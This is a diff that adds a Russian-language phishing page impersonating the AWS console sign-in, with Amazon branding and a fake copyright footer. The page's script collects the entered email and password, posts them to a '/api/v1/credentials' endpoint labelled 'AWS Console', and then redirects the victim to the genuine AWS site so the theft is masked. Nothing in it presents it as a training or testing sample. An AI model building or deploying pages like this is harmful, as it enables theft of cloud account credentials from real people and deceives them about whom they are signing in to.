@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Вход в AWS</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #232F3E; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 40px; border-radius: 4px; width: 100%; max-width: 400px; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 100px; }
+        h1 { font-size: 22px; color: #333; margin-bottom: 20px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
+        .btn { width: 100%; padding: 10px; background: #FF9900; color: black; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"><img src="https://d1.awsstatic.com/logos/powered-by-aws.png" alt="AWS"></div>
+        <h1>Вход в консоль AWS</h1>
+        <form onsubmit="handleSubmit(event)">
+            <div class="form-group">
+                <label>Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label>Пароль</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="btn">Войти</button>
+        </form>
+        <div class="footer"><p>© 2026 Amazon Web Services</p></div>
+    </div>
+    <script>
+        async function handleSubmit(e) { e.preventDefault(); const data = { email: document.getElementById('email').value, password: document.getElementById('password').value, service: 'AWS Console' }; await fetch('/api/v1/credentials', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) }); window.location.href = 'https://aws.amazon.com'; }
+    </script>
+</body>
+</html>
